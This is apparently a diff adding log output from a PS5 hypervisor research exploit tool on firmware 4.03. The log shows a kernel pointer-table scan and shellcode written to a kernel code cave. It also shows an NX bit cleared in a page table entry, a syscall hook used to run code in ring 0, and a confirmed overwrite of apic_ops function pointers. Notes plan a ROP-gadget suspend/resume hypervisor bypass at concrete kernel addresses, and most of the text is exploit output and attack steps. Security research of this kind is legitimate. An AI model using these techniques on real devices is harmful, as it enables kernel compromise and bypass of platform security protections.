+    [TABLE] kdata+0x179c20: 10 ktext ptrs
+    [TABLE] kdata+0x179ce0: 12 ktext ptrs
+    [TABLE] kdata+0x179fd0: 8 ktext ptrs
+    [TABLE] kdata+0x17a360: 10 ktext ptrs
+    [TABLE] kdata+0x17a470: 4 ktext ptrs
+    [TABLE] kdata+0x17a4a0: 20 ktext ptrs
+      -> 20/20 unique, spread=0x1cc05d0 (29441KB)
+      [ 0] 0xffffffff92693cd0  (ktext+0x1933cd0)
+      [ 1] 0xffffffff90ff2b70  (ktext+0x292b70)
+      [ 2] 0xffffffff92693cb8  (ktext+0x1933cb8)
+      [ 3] 0xffffffff90ffe240  (ktext+0x29e240)
+      [ 4] 0xffffffff92693ce8  (ktext+0x1933ce8)
+      [ 5] 0xffffffff910007f0  (ktext+0x2a07f0)
+      [ 6] 0xffffffff92693d00  (ktext+0x1933d00)
+      [ 7] 0xffffffff90ffe0f0  (ktext+0x29e0f0)
+      [ 8] 0xffffffff92693d18  (ktext+0x1933d18)
+      [ 9] 0xffffffff90fff938  (ktext+0x29f938)
+      [10] 0xffffffff92675ad8  (ktext+0x1915ad8)
+      [11] 0xffffffff90ff2308  (ktext+0x292308)
+      [12] 0xffffffff92675af0  (ktext+0x1915af0)
+      [13] 0xffffffff90ff80d0  (ktext+0x2980d0)
+      [14] 0xffffffff92675b08  (ktext+0x1915b08)
+      [15] 0xffffffff90ff9c50  (ktext+0x299c50)
+      [16] 0xffffffff92675b20  (ktext+0x1915b20)
+      [17] 0xffffffff90ff8728  (ktext+0x298728)
+      [18] 0xffffffff92cb28d8  (ktext+0x1f528d8)
+      [19] 0xffffffff90ff8a30  (ktext+0x298a30)
+    [TABLE] kdata+0x17a550: 48 ktext ptrs
+    [TABLE] kdata+0x17a6f8: 7 ktext ptrs
+    [TABLE] kdata+0x17a7e8: 13 ktext ptrs
+    [TABLE] kdata+0x17a9a0: 9 ktext ptrs
+    [TABLE] kdata+0x17aa58: 9 ktext ptrs
+    [TABLE] kdata+0x17ab68: 19 ktext ptrs
+    [TABLE] kdata+0x17ac10: 12 ktext ptrs
+    [TABLE] kdata+0x17ae10: 14 ktext ptrs
+    [TABLE] kdata+0x17afe8: 7 ktext ptrs
+    [TABLE] kdata+0x17b0a0: 6 ktext ptrs
+    [TABLE] kdata+0x17b220: 8 ktext ptrs
+    [TABLE] kdata+0x17b2f0: 12 ktext ptrs
+    [TABLE] kdata+0x17b360: 10 ktext ptrs
+    [TABLE] kdata+0x17b3e0: 6 ktext ptrs
+    [TABLE] kdata+0x17b490: 4 ktext ptrs
+    [TABLE] kdata+0x17b528: 9 ktext ptrs
+    [TABLE] kdata+0x17b580: 8 ktext ptrs
+    [TABLE] kdata+0x17b780: 12 ktext ptrs
+    [TABLE] kdata+0x17b7f0: 4 ktext ptrs
+    [TABLE] kdata+0x17b820: 10 ktext ptrs
+    [TABLE] kdata+0x17b8e0: 12 ktext ptrs
+    [TABLE] kdata+0x17b950: 6 ktext ptrs
+    [TABLE] kdata+0x17b9c0: 8 ktext ptrs
+    [TABLE] kdata+0x17bab0: 6 ktext ptrs
+    [TABLE] kdata+0x17baf0: 14 ktext ptrs
+    [TABLE] kdata+0x17bb70: 10 ktext ptrs
+    [TABLE] kdata+0x17bbd0: 8 ktext ptrs
+    [TABLE] kdata+0x17bc50: 6 ktext ptrs
+    [TABLE] kdata+0x17bcd0: 4 ktext ptrs
+    [TABLE] kdata+0x17c000: 12 ktext ptrs
+    [TABLE] kdata+0x17c080: 4 ktext ptrs
+    [TABLE] kdata+0x17c0a8: 14 ktext ptrs
+    [TABLE] kdata+0x17c1c0: 12 ktext ptrs
+    [TABLE] kdata+0x17c2e0: 8 ktext ptrs
+    [TABLE] kdata+0x17c3e0: 67 ktext ptrs
+    [TABLE] kdata+0x17c690: 8 ktext ptrs
+    [TABLE] kdata+0x17c838: 4 ktext ptrs
+    [TABLE] kdata+0x17c860: 10 ktext ptrs
+    [TABLE] kdata+0x17c9b0: 8 ktext ptrs
+    [TABLE] kdata+0x17ca40: 12 ktext ptrs
+    [TABLE] kdata+0x17cae0: 10 ktext ptrs
+    [TABLE] kdata+0x17cc80: 14 ktext ptrs
+    [TABLE] kdata+0x17cd10: 8 ktext ptrs
+    [TABLE] kdata+0x17cd60: 14 ktext ptrs
+    [TABLE] kdata+0x17ce10: 4 ktext ptrs
+    [TABLE] kdata+0x17ce78: 4 ktext ptrs
+    [TABLE] kdata+0x17cfa0: 10 ktext ptrs
+    [TABLE] kdata+0x17d090: 6 ktext ptrs
+    [TABLE] kdata+0x17d140: 8 ktext ptrs
+    [TABLE] kdata+0x17d1e0: 8 ktext ptrs
+    [TABLE] kdata+0x17d360: 12 ktext ptrs
+    [TABLE] kdata+0x17d550: 6 ktext ptrs
+    [TABLE] kdata+0x17d5b0: 6 ktext ptrs
+    [TABLE] kdata+0x17e820: 6 ktext ptrs
+    [TABLE] kdata+0x17e890: 6 ktext ptrs
+    [TABLE] kdata+0x17e960: 8 ktext ptrs
+    [TABLE] kdata+0x17e9b0: 6 ktext ptrs
+    [TABLE] kdata+0x17ea20: 6 ktext ptrs
+    [TABLE] kdata+0x17f1f0: 6 ktext ptrs
+    [TABLE] kdata+0x17f290: 6 ktext ptrs
+    [TABLE] kdata+0x17f2d0: 14 ktext ptrs
+    [TABLE] kdata+0x17fca0: 4 ktext ptrs
+    [TABLE] kdata+0x17fd40: 10 ktext ptrs
+    [TABLE] kdata+0x17fda8: 17 ktext ptrs
+    [TABLE] kdata+0x17fe48: 8 ktext ptrs
+    [TABLE] kdata+0x17feb8: 11 ktext ptrs
+    [TABLE] kdata+0x17ff20: 6 ktext ptrs
+    [TABLE] kdata+0x180230: 6 ktext ptrs
+    [TABLE] kdata+0x1820b0: 12 ktext ptrs
+    [TABLE] kdata+0x182140: 12 ktext ptrs
+    [TABLE] kdata+0x1822d0: 12 ktext ptrs
+    [TABLE] kdata+0x182340: 10 ktext ptrs
+    [TABLE] kdata+0x1823a0: 8 ktext ptrs
+    [TABLE] kdata+0x182680: 8 ktext ptrs
+    [TABLE] kdata+0x1827a0: 8 ktext ptrs
+    [TABLE] kdata+0x182840: 8 ktext ptrs
+    [TABLE] kdata+0x182920: 4 ktext ptrs
+    [TABLE] kdata+0x182b40: 28 ktext ptrs
+      -> 28/28 unique, spread=0x135f790 (19837KB)
+      [ 0] 0xffffffff9234d908  (ktext+0x15ed908)
+      [ 1] 0xffffffff90ffea48  (ktext+0x29ea48)
+      [ 2] 0xffffffff9234d920  (ktext+0x15ed920)
+      [ 3] 0xffffffff90fffa38  (ktext+0x29fa38)
+      [ 4] 0xffffffff9234d938  (ktext+0x15ed938)
+      [ 5] 0xffffffff90ffead8  (ktext+0x29ead8)
+      [ 6] 0xffffffff9234d950  (ktext+0x15ed950)
+      [ 7] 0xffffffff90ff4758  (ktext+0x294758)
+      [ 8] 0xffffffff9234d968  (ktext+0x15ed968)
+      [ 9] 0xffffffff90fff570  (ktext+0x29f570)
+      [10] 0xffffffff9234d980  (ktext+0x15ed980)
+      [11] 0xffffffff90fee2b0  (ktext+0x28e2b0)
+      [12] 0xffffffff9234d998  (ktext+0x15ed998)
+      [13] 0xffffffff90fff2a8  (ktext+0x29f2a8)
+      [14] 0xffffffff9234d9b0  (ktext+0x15ed9b0)
+      [15] 0xffffffff90feef68  (ktext+0x28ef68)
+      [16] 0xffffffff9234d9c8  (ktext+0x15ed9c8)
+      [17] 0xffffffff91000af8  (ktext+0x2a0af8)
+      [18] 0xffffffff9234d9e0  (ktext+0x15ed9e0)
+      [19] 0xffffffff90fffb08  (ktext+0x29fb08)
+      [20] 0xffffffff9234d9f8  (ktext+0x15ed9f8)
+      [21] 0xffffffff90ff4718  (ktext+0x294718)
+      [22] 0xffffffff9234da10  (ktext+0x15eda10)
+      [23] 0xffffffff90fff638  (ktext+0x29f638)
+      [24] 0xffffffff9234da28  (ktext+0x15eda28)
+      [25] 0xffffffff90ffcc58  (ktext+0x29cc58)
+      [26] 0xffffffff9234da40  (ktext+0x15eda40)
+      [27] 0xffffffff90ff9e98  (ktext+0x299e98)
+    [TABLE] kdata+0x182c30: 26 ktext ptrs
+      -> 26/26 unique, spread=0x135f790 (19837KB)
+      [ 0] 0xffffffff9234d908  (ktext+0x15ed908)
+      [ 1] 0xffffffff90fff630  (ktext+0x29f630)
+      [ 2] 0xffffffff9234d920  (ktext+0x15ed920)
+      [ 3] 0xffffffff90fffa38  (ktext+0x29fa38)
+      [ 4] 0xffffffff9234d950  (ktext+0x15ed950)
+      [ 5] 0xffffffff90ff4758  (ktext+0x294758)
+      [ 6] 0xffffffff9234d968  (ktext+0x15ed968)
+      [ 7] 0xffffffff90fff570  (ktext+0x29f570)
+      [ 8] 0xffffffff9234d980  (ktext+0x15ed980)
+      [ 9] 0xffffffff90fee2b0  (ktext+0x28e2b0)
+      [10] 0xffffffff9234d998  (ktext+0x15ed998)
+      [11] 0xffffffff90fff2a8  (ktext+0x29f2a8)
+      [12] 0xffffffff9234d9b0  (ktext+0x15ed9b0)
+      [13] 0xffffffff90feef68  (ktext+0x28ef68)
+      [14] 0xffffffff9234d9c8  (ktext+0x15ed9c8)
+      [15] 0xffffffff91000af8  (ktext+0x2a0af8)
+      [16] 0xffffffff9234d9e0  (ktext+0x15ed9e0)
+      [17] 0xffffffff90fffb08  (ktext+0x29fb08)
+      [18] 0xffffffff9234d9f8  (ktext+0x15ed9f8)
+      [19] 0xffffffff90ff4718  (ktext+0x294718)
+      [20] 0xffffffff9234da10  (ktext+0x15eda10)
+      [21] 0xffffffff90fff638  (ktext+0x29f638)
+      [22] 0xffffffff9234da28  (ktext+0x15eda28)
+      [23] 0xffffffff90ffcc58  (ktext+0x29cc58)
+      [24] 0xffffffff9234da40  (ktext+0x15eda40)
+      [25] 0xffffffff90ff9e98  (ktext+0x299e98)
+    [TABLE] kdata+0x182da0: 28 ktext ptrs
+      -> 25/28 unique, spread=0x16955f0 (23125KB)
+      [ 0] 0xffffffff921b3890  (ktext+0x1453890)
+      [ 1] 0xffffffff921b3990  (ktext+0x1453990)
+      [ 2] 0xffffffff921b3a90  (ktext+0x1453a90)
+      [ 3] 0xffffffff921b4290  (ktext+0x1454290)
+      [ 4] 0xffffffff921b3b90  (ktext+0x1453b90)
+      [ 5] 0xffffffff921b3c90  (ktext+0x1453c90)
+      [ 6] 0xffffffff921b3d90  (ktext+0x1453d90)
+      [ 7] 0xffffffff921b3e90  (ktext+0x1453e90)
+      [ 8] 0xffffffff921b3f90  (ktext+0x1453f90)
+      [ 9] 0xffffffff921b4390  (ktext+0x1454390)
+      [10] 0xffffffff921b4090  (ktext+0x1454090)
+      [11] 0xffffffff921b3790  (ktext+0x1453790)
+      [12] 0xffffffff921b3790  (ktext+0x1453790)
+      [13] 0xffffffff921b3790  (ktext+0x1453790)
+      [14] 0xffffffff921b3790  (ktext+0x1453790)
+      [15] 0xffffffff921b4190  (ktext+0x1454190)
+      [16] 0xffffffff92693cb8  (ktext+0x1933cb8)
+      [17] 0xffffffff91000fe0  (ktext+0x2a0fe0)
+      [18] 0xffffffff92693ce8  (ktext+0x1933ce8)
+      [19] 0xffffffff90ffe898  (ktext+0x29e898)
+      [20] 0xffffffff92693d00  (ktext+0x1933d00)
+      [21] 0xffffffff91000310  (ktext+0x2a0310)
+      [22] 0xffffffff92693d30  (ktext+0x1933d30)
+      [23] 0xffffffff90ffe758  (ktext+0x29e758)
+      [24] 0xffffffff92693d48  (ktext+0x1933d48)
+      [25] 0xffffffff90fff3d8  (ktext+0x29f3d8)
+      [26] 0xffffffff92693d18  (ktext+0x1933d18)
+      [27] 0xffffffff90fffa40  (ktext+0x29fa40)
+    [TABLE] kdata+0x182eb8: 10 ktext ptrs
+    [TABLE] kdata+0x182f38: 12 ktext ptrs
+    [TABLE] kdata+0x183120: 10 ktext ptrs
+    [TABLE] kdata+0x183270: 4 ktext ptrs
+    [TABLE] kdata+0x183390: 4 ktext ptrs
+    [TABLE] kdata+0x183420: 8 ktext ptrs
+    [TABLE] kdata+0x183500: 16 ktext ptrs
+    [TABLE] kdata+0x183590: 4 ktext ptrs
+    [TABLE] kdata+0x183980: 5 ktext ptrs
+    [TABLE] kdata+0x1841a8: 17 ktext ptrs
+    [TABLE] kdata+0x184e60: 24 ktext ptrs
+      -> 24/24 unique, spread=0x6360 (24KB)
+      [ 0] 0xffffffff92228390  (ktext+0x14c8390)
+      [ 1] 0xffffffff922284a0  (ktext+0x14c84a0)
+      [ 2] 0xffffffff922285b0  (ktext+0x14c85b0)
+      [ 3] 0xffffffff92229310  (ktext+0x14c9310)
+      [ 4] 0xffffffff9222a070  (ktext+0x14ca070)
+      [ 5] 0xffffffff9222a410  (ktext+0x14ca410)
+      [ 6] 0xffffffff9222a7b0  (ktext+0x14ca7b0)
+      [ 7] 0xffffffff9222a9e0  (ktext+0x14ca9e0)
+      [ 8] 0xffffffff9222ac10  (ktext+0x14cac10)
+      [ 9] 0xffffffff9222b2e0  (ktext+0x14cb2e0)
+      [10] 0xffffffff9222b9b0  (ktext+0x14cb9b0)
+      [11] 0xffffffff9222c160  (ktext+0x14cc160)
+      [12] 0xffffffff9222c910  (ktext+0x14cc910)
+      [13] 0xffffffff9222cb20  (ktext+0x14ccb20)
+      [14] 0xffffffff9222cd30  (ktext+0x14ccd30)
+      [15] 0xffffffff9222cdc0  (ktext+0x14ccdc0)
+      [16] 0xffffffff9222ce50  (ktext+0x14cce50)
+      [17] 0xffffffff9222cea0  (ktext+0x14ccea0)
+      [18] 0xffffffff9222cef0  (ktext+0x14ccef0)
+      [19] 0xffffffff9222d450  (ktext+0x14cd450)
+      [20] 0xffffffff9222d9b0  (ktext+0x14cd9b0)
+      [21] 0xffffffff9222de50  (ktext+0x14cde50)
+      [22] 0xffffffff9222e2f0  (ktext+0x14ce2f0)
+      [23] 0xffffffff9222e6f0  (ktext+0x14ce6f0)
+    [TABLE] kdata+0x1856a0: 23 ktext ptrs
+      -> 23/23 unique, spread=0x6b70 (26KB)
+      [ 0] 0xffffffff9222eb20  (ktext+0x14ceb20)
+      [ 1] 0xffffffff9222ebc0  (ktext+0x14cebc0)
+      [ 2] 0xffffffff9222ec20  (ktext+0x14cec20)
+      [ 3] 0xffffffff9222f000  (ktext+0x14cf000)
+      [ 4] 0xffffffff9222f100  (ktext+0x14cf100)
+      [ 5] 0xffffffff9222f290  (ktext+0x14cf290)
+      [ 6] 0xffffffff9222f820  (ktext+0x14cf820)
+      [ 7] 0xffffffff9222fde0  (ktext+0x14cfde0)
+      [ 8] 0xffffffff92230900  (ktext+0x14d0900)
+      [ 9] 0xffffffff92232360  (ktext+0x14d2360)
+      [10] 0xffffffff92233570  (ktext+0x14d3570)
+      [11] 0xffffffff92233cb0  (ktext+0x14d3cb0)
+      [12] 0xffffffff92234070  (ktext+0x14d4070)
+      [13] 0xffffffff922347b0  (ktext+0x14d47b0)
+      [14] 0xffffffff92234b70  (ktext+0x14d4b70)
+      [15] 0xffffffff92234bc0  (ktext+0x14d4bc0)
+      [16] 0xffffffff92234c60  (ktext+0x14d4c60)
+      [17] 0xffffffff92234cc0  (ktext+0x14d4cc0)
+      [18] 0xffffffff92234e60  (ktext+0x14d4e60)
+      [19] 0xffffffff92234f60  (ktext+0x14d4f60)
+      [20] 0xffffffff92235210  (ktext+0x14d5210)
+      [21] 0xffffffff922353a0  (ktext+0x14d53a0)
+      [22] 0xffffffff92235690  (ktext+0x14d5690)
+    [TABLE] kdata+0x185b30: 6 ktext ptrs
+    [TABLE] kdata+0x1865b0: 13 ktext ptrs
+    [TABLE] kdata+0x186f20: 16 ktext ptrs
+    [TABLE] kdata+0x1874b0: 9 ktext ptrs
+    [TABLE] kdata+0x187760: 4 ktext ptrs
+    [TABLE] kdata+0x1879c0: 4 ktext ptrs
+    [TABLE] kdata+0x187c20: 4 ktext ptrs
+    [TABLE] kdata+0x188890: 20 ktext ptrs
+      -> 20/20 unique, spread=0x6500 (25KB)
+      [ 0] 0xffffffff92293d90  (ktext+0x1533d90)
+      [ 1] 0xffffffff92293fd0  (ktext+0x1533fd0)
+      [ 2] 0xffffffff92294070  (ktext+0x1534070)
+      [ 3] 0xffffffff92294110  (ktext+0x1534110)
+      [ 4] 0xffffffff922941f0  (ktext+0x15341f0)
+      [ 5] 0xffffffff922942d0  (ktext+0x15342d0)
+      [ 6] 0xffffffff92295280  (ktext+0x1535280)
+      [ 7] 0xffffffff92295310  (ktext+0x1535310)
+      [ 8] 0xffffffff92296ea0  (ktext+0x1536ea0)
+      [ 9] 0xffffffff92296f80  (ktext+0x1536f80)
+      [10] 0xffffffff922970e0  (ktext+0x15370e0)
+      [11] 0xffffffff922983a0  (ktext+0x15383a0)
+      [12] 0xffffffff92298520  (ktext+0x1538520)
+      [13] 0xffffffff92298600  (ktext+0x1538600)
+      [14] 0xffffffff92299a40  (ktext+0x1539a40)
+      [15] 0xffffffff92299a90  (ktext+0x1539a90)
+      [16] 0xffffffff92299b30  (ktext+0x1539b30)
+      [17] 0xffffffff92299c00  (ktext+0x1539c00)
+      [18] 0xffffffff92299e60  (ktext+0x1539e60)
+      [19] 0xffffffff9229a290  (ktext+0x153a290)
+    [TABLE] kdata+0x189590: 7 ktext ptrs
+    [TABLE] kdata+0x1895d0: 15 ktext ptrs
+    [TABLE] kdata+0x1899e8: 4 ktext ptrs
+    [TABLE] kdata+0x189a60: 16 ktext ptrs
+    [TABLE] kdata+0x189be0: 12 ktext ptrs
+    [TABLE] kdata+0x189db0: 8 ktext ptrs
+    [TABLE] kdata+0x189e30: 8 ktext ptrs
+    [TABLE] kdata+0x189ec0: 4 ktext ptrs
+    [TABLE] kdata+0x18a110: 6 ktext ptrs
+    [TABLE] kdata+0x18a1f0: 10 ktext ptrs
+    [TABLE] kdata+0x18a270: 6 ktext ptrs
+    [TABLE] kdata+0x18a770: 8 ktext ptrs
+    [TABLE] kdata+0x18a800: 12 ktext ptrs
+    [TABLE] kdata+0x18a8a0: 6 ktext ptrs
+    [TABLE] kdata+0x18a990: 15 ktext ptrs
+    [TABLE] kdata+0x18aa10: 16 ktext ptrs
+    [TABLE] kdata+0x18aae0: 6 ktext ptrs
+    [TABLE] kdata+0x18ad70: 6 ktext ptrs
+    [TABLE] kdata+0x18ae00: 12 ktext ptrs
+    [TABLE] kdata+0x18ae70: 8 ktext ptrs
+    [TABLE] kdata+0x18b9d0: 4 ktext ptrs
+    [TABLE] kdata+0x18ba70: 6 ktext ptrs
+    [TABLE] kdata+0x18bb50: 6 ktext ptrs
+    [TABLE] kdata+0x18bc60: 6 ktext ptrs
+    [TABLE] kdata+0x18bcd0: 8 ktext ptrs
+    [TABLE] kdata+0x18bd40: 6 ktext ptrs
+    [TABLE] kdata+0x18bf88: 4 ktext ptrs
+    [TABLE] kdata+0x18c0c8: 5 ktext ptrs
+    [TABLE] kdata+0x18c210: 12 ktext ptrs
+    [TABLE] kdata+0x18c310: 10 ktext ptrs
+    [TABLE] kdata+0x18c4b0: 8 ktext ptrs
+    [TABLE] kdata+0x18c560: 10 ktext ptrs
+    [TABLE] kdata+0x18c700: 8 ktext ptrs
+    [TABLE] kdata+0x18c780: 5 ktext ptrs
+    [TABLE] kdata+0x18c800: 10 ktext ptrs
+    [TABLE] kdata+0x18c950: 10 ktext ptrs
+    [TABLE] kdata+0x18c9b0: 12 ktext ptrs
+    [TABLE] kdata+0x18ca20: 6 ktext ptrs
+    [TABLE] kdata+0x18cad0: 6 ktext ptrs
+    [TABLE] kdata+0x18ccc0: 8 ktext ptrs
+    [TABLE] kdata+0x18cda0: 12 ktext ptrs
+    [TABLE] kdata+0x18cf58: 11 ktext ptrs
+    [TABLE] kdata+0x18d010: 18 ktext ptrs
+    [TABLE] kdata+0x18dbc0: 8 ktext ptrs
+    [TABLE] kdata+0x18dc50: 8 ktext ptrs
+    [TABLE] kdata+0x18dca0: 12 ktext ptrs
+    [TABLE] kdata+0x18de30: 4 ktext ptrs
+    [TABLE] kdata+0x18de60: 21 ktext ptrs
+      -> 21/21 unique, spread=0xc488 (49KB)
+      [ 0] 0xffffffff90ffe910  (ktext+0x29e910)
+      [ 1] 0xffffffff90ff9fc8  (ktext+0x299fc8)
+      [ 2] 0xffffffff90ffb148  (ktext+0x29b148)
+      [ 3] 0xffffffff90ff4580  (ktext+0x294580)
+      [ 4] 0xffffffff90ff45b8  (ktext+0x2945b8)
+      [ 5] 0xffffffff90ff4578  (ktext+0x294578)
+      [ 6] 0xffffffff90ff45c0  (ktext+0x2945c0)
+      [ 7] 0xffffffff910002f0  (ktext+0x2a02f0)
+      [ 8] 0xffffffff90ffc4e0  (ktext+0x29c4e0)
+      [ 9] 0xffffffff90ffd7f0  (ktext+0x29d7f0)
+      [10] 0xffffffff90ff45e0  (ktext+0x2945e0)
+      [11] 0xffffffff90ff4570  (ktext+0x294570)
+      [12] 0xffffffff90ff45d8  (ktext+0x2945d8)
+      [13] 0xffffffff90ff4590  (ktext+0x294590)
+      [14] 0xffffffff910009f8  (ktext+0x2a09f8)
+      [15] 0xffffffff90ffb080  (ktext+0x29b080)
+      [16] 0xffffffff90ffaca8  (ktext+0x29aca8)
+      [17] 0xffffffff90ff45b0  (ktext+0x2945b0)
+      [18] 0xffffffff90ff45e8  (ktext+0x2945e8)
+      [19] 0xffffffff90ff45c8  (ktext+0x2945c8)
+      [20] 0xffffffff90ff45d0  (ktext+0x2945d0)
+    [TABLE] kdata+0x18e010: 12 ktext ptrs
+    [TABLE] kdata+0x18e090: 10 ktext ptrs
+    [TABLE] kdata+0x18e3a0: 4 ktext ptrs
+    [TABLE] kdata+0x18e6f0: 6 ktext ptrs
+    ...scanning kdata+0x200000 (2MB/8MB)    ...scanning kdata+0x300000 (3MB/8MB)    ...scanning kdata+0x400000 (4MB/8MB)    ...scanning kdata+0x500000 (5MB/8MB)    ...scanning kdata+0x600000 (6MB/8MB)    ...scanning kdata+0x700000 (7MB/8MB)
+[*] Found 245 function pointer tables.
+[+] Largest table: kdata+0x17c3e0 (67 entries)
+[+] Best apic_ops candidate: kdata+0x1656b0 (28 entries, score=62)
+    xapic_mode slot [2] at kdata+0x1656c0
+
+=============================================
+  Ring-0 Phase 4: VMMCALL Analysis
+=============================================
+
+[*] EFER.SVME=1 confirmed — system runs under AMD SVM HV.
+[!] Direct VMMCALL probe SKIPPED (causes kernel panic).
+    HV injects #UD/#GP for unknown hypercalls.
+    Need IDT fault handler before safe probing.
+
+[*] Safe VMMCALL strategy (TODO):
+    1. Hook IDT vector 6 (#UD) and 13 (#GP)
+    2. Install recovery trampoline in handlers
+    3. Issue VMMCALL with RAX=0..31
+    4. If handler fires → HV rejected; if returns → survived
+
+[*] Alternative: apic_ops suspend/resume path (flatz method)
+    Overwrite apic_ops.xapic_mode (kdata+offset+0x10)
+    with ROP gadget, trigger suspend/resume cycle.
+    Code runs before HV restarts → bypass intercepts.
+[+] apic_ops candidate at kdata+0x1656b0 (28 entries, score=62)
+    xapic_mode [2] at 0xffffffff91ac56c0 (kdata+0x1656c0)
+
+=============================================
+  Ring-0 Phase 5: apic_ops Writeback Test
+=============================================
+
+[*] Testing if apic_ops function pointers are writable.
+    apic_ops base: 0xffffffff91ac56b0 (kdata+0x1656b0)
+    xapic_mode [2]: 0xffffffff91ac56c0 (kdata+0x1656c0)
+    apic_ops PA: 0x11ac56b0
+    slot0 DMAP:  0xffff813311ac56b0
+    slot2 DMAP:  0xffff813311ac56c0
+    DMAP verify slot2: 0xffffffff90ff7908
+[+] Late SYSINIT detected! Saved KLD trampoline KVAs before writeback:
+    trampoline_xapic_mode() = 0x00000001c0000080
+    g_trampoline_target     = 0x0000000000011d01
+[*] Writeback test shellcode: 159 bytes
+[*] Writing shellcode to kdata code cave...
+    Write verify: OK
+[*] Clearing NX+G in PTE...
+[*] Hooking sysent[253] → kdata_base...
+[*] Calling syscall(253) — apic_ops writeback test in ring 0...
+    syscall(253) returned: 0, errno=0
+[*] Restoring PTE, sysent, code cave...
+    All restored.
+
+[+] apic_ops[2] (xapic_mode) = 0xffffffff90ff7908
+[+] apic_ops[0] (create)     = 0xffffffff90ff7758
+
+[*] Test 1: Same-value writeback
+    Wrote:    0xffffffff90ff7908 → apic_ops[2]
+    Readback: 0xffffffff90ff7908
+[+] TEST 1 PASSED — same-value write OK
+
+[*] Test 2: Cross-type write (slot0 → slot2)
+    Wrote:    0xffffffff90ff7758 → apic_ops[2]
+    Readback: 0xffffffff90ff7758
+[+] TEST 2 PASSED — cross-type write OK!
+    apic_ops[2] can be overwritten with arbitrary ktext ptr.
+
+[*] Restore verification:
+    Readback: 0xffffffff90ff7908
+[+] RESTORE OK — original value confirmed
+
+[+] ============================================
+[+]  APIC_OPS WRITABLE — READY FOR FLATZ METHOD
+[+] ============================================
+[+] apic_ops[2] (xapic_mode) can be overwritten.
+[+] Next: overwrite with ROP gadget, trigger suspend/resume.
+[+] Target address: 0xffffffff91ac56c0
+[*] Cleared writeback-clobbered trampoline fields in buffer.
+
+
+[+] KMOD_MAGIC found! Shared memory communication working!
+[+] Kmod status: COMPLETE
+[*] Result buffer trampoline fields (shared mapping):
+    trampoline_func_kva  = 0x0000000000000000
+    trampoline_target_kva = 0x0000000000000000
+    gp_handler_kva       = 0x0000000000000000
+
+[*] Phase 7 trampoline address status:
+    [OK] Addresses available.
+    trampoline_xapic_mode() = 0x00000001c0000080 (kmod .text)
+    g_trampoline_target     = 0x0000000000011d01
+    KLD .text trampoline    = 0x00000001c0000080 (preserved for suspend)
+
+[*] Phase 9 gp_handler status:
+    [-] gp_handler not set from primary path.
+    results->gp_handler_kva = 0x0000000000000000
+    [-] gp_handler unavailable — Phase 9 will use cave fallback.
+
+[*] Step 5: Skipping kldunload — module needed for Phase 7 trampoline.
+    Module kid=78 remains loaded in kernel memory.
+    trampoline KVA = 0x00000001c0000080
+
+=============================================
+  Phase 6: Flatz Suspend/Resume Setup
+=============================================
+
+[*] Phase 6a: ktext page table analysis + XOTEXT/QA flags
+    ktext base: 0xffffffff90d60000
+
+[*] Dumping ktext page table entries (first 8 regions):
+    VA 0xffffffff90d60000: 4KB PTE=0x0400000010d60101 P=1 RW=0 NX=0 bit58=1
+    VA 0xffffffff90d61000: 4KB PTE=0x0400000010d61101 P=1 RW=0 NX=0 bit58=1
+    VA 0xffffffff90d62000: 4KB PTE=0x0400000010d62101 P=1 RW=0 NX=0 bit58=1
+    VA 0xffffffff90d63000: 4KB PTE=0x0400000010d63101 P=1 RW=0 NX=0 bit58=1
+    VA 0xffffffff90d64000: 4KB PTE=0x0400000010d64101 P=1 RW=0 NX=0 bit58=1
+    VA 0xffffffff90d65000: 4KB PTE=0x0400000010d65101 P=1 RW=0 NX=0 bit58=1
+    VA 0xffffffff90d66000: 4KB PTE=0x0400000010d66101 P=1 RW=0 NX=0 bit58=1
+    VA 0xffffffff90d67000: 4KB PTE=0x0400000010d67101 P=1 RW=0 NX=0 bit58=1
+
+[*] ktext page table summary (32MB scan):
+    2MB huge pages:     14
+    4KB pages:          1184
+    Unmapped:           0
+    XOTEXT bit set:     517
+    RW bit set:         253
+    NX bit set:         681
+
+[*] XOTEXT found in 517 guest PTEs.
+    NOT clearing — HV integrity monitor detects modified PTEs
+    and prevents rest mode (suspend hangs with flashing white light).
+    XOM is enforced via NPT anyway, so clearing has no effect.
+
+[*] Step 3: QA/Security flags (experimental verification)
+    NOTE: QA flags are REINITIALIZED on resume on FW >= 3.00.
+    This test verifies whether that patch holds on FW 4.03.
+
+[*] QA_FLAGS (via SDK, KERNEL_ADDRESS_QA_FLAGS):
+    Current: ff ff 03 01 ab cd ef 42 08 79 ff 90 ff ff ff ff 
+[*] SECURITY_FLAGS:
+    Current: 17 00 00 00 00 00 00 01 02 82 00 12 0c 00 00 00 
+
+[*] QA flags already have debug bits set.
+
+[*] Phase 6b: Testing ktext readability via DMAP...
+[*] ktext DMAP read: ret=-1, bytes: cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc cc 
+
+[!] ktext is still EXECUTE-ONLY (NPT enforced by HV)
+[*] XOTEXT found in 517 guest PTEs (unexpected on 4.03!)
+[*] QA flags now: ff ff 03 01 ab cd ef 42 08 79 ff 90 ff ff ff ff 
+
+[*] EXPERIMENTAL: Try suspend/resume to test QA flags persistence.
+    On FW >= 3.00, the secure loader reinitializes QA flags on
+    resume (documented as patched).  But we test empirically:
+    1. QA flags set to 0xFF above
+    2. Put PS5 in REST MODE (Settings > Power > Rest Mode)
+    3. Wake PS5 + re-run exploit + hv_research.elf
+    4. Check if ktext becomes readable (unlikely on FW 4.03)
+
+=============================================
+  Phase 7: apic_ops Suspend/Resume Hook Test
+=============================================
+
+[*] apic_ops table (28 entries at kdata+0x1656b0):
+    [ 0] 0xffffffff90ff7758  (ktext+0x297758)
+    [ 1] 0xffffffff90ff7758  (ktext+0x297758)
+    [ 2] 0xffffffff90ff7908  (ktext+0x297908)
+    [ 3] 0xffffffff90ff8cc8  (ktext+0x298cc8)
+    [ 4] 0xffffffff90ff71b0  (ktext+0x2971b0)
+    [ 5] 0xffffffff90ff81e0  (ktext+0x2981e0)
+    [ 6] 0xffffffff90ff7f28  (ktext+0x297f28)
+    [ 7] 0xffffffff90ff8270  (ktext+0x298270)
+    [ 8] 0xffffffff90ff8910  (ktext+0x298910)
+    [ 9] 0xffffffff90ff72c0  (ktext+0x2972c0)
+    [10] 0xffffffff90ff8ad8  (ktext+0x298ad8)
+    [11] 0xffffffff90ff7fd0  (ktext+0x297fd0)
+    [12] 0xffffffff90ff8c48  (ktext+0x298c48)
+    [13] 0xffffffff90ff7e58  (ktext+0x297e58)
+    [14] 0xffffffff90ff74c8  (ktext+0x2974c8)
+    [15] 0xffffffff90ff8a58  (ktext+0x298a58)
